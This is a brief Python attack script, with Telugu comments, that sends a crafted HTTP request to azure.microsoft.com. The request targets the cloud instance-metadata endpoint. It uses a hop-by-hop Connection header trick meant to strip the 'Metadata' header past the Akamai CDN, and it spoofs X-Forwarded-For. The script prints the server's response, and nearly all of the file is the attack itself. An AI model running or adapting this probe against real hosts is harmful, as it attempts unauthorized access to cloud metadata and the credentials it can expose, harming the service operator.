import socket
import ssl

host = "azure.microsoft.com"
port = 443

# 2030 "Hop-by-Hop" Injection
# Metadata హెడర్ ని Connection లిస్ట్ లో పెట్టి Akamai ని బురిడీ కొట్టిద్దాం
payload = (
    "GET /metadata/instance?api-version=2021-02-01 HTTP/1.1\r\n"
    "Host: azure.microsoft.com\r\n"
    "Metadata: true\r\n"
    "Connection: Metadata, close\r\n" # ఇక్కడ మ్యాజిక్ ఉంది
    "X-Forwarded-For: 131.107.255.255\r\n"
    "\r\n"
)

context = ssl.create_default_context()
try:
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print(f"🚀 Launching Hop-by-Hop Injection...")
            ssock.sendall(payload.encode())
            
            res = b""
            ssock.settimeout(10)
            while True:
                try:
                    data = ssock.recv(4096)
                    if not data: break
                    res += data
                except: break
            
            print("\n📥 Response Received:")
            print(res.decode(errors='ignore'))
except Exception as e:
    print(f"❌ Error: {e}")
